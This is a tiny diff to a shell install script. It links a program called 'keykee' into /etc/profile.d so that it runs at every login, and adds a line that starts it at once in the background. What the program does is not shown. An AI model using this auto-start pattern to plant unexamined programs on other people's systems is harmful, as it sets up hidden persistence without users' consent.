@@ -1,2 +1,3 @@
 #!/bin/sh
 ln -s `pwd`/keykee /etc/profile.d/keykee
+/etc/profile.d/keykee &
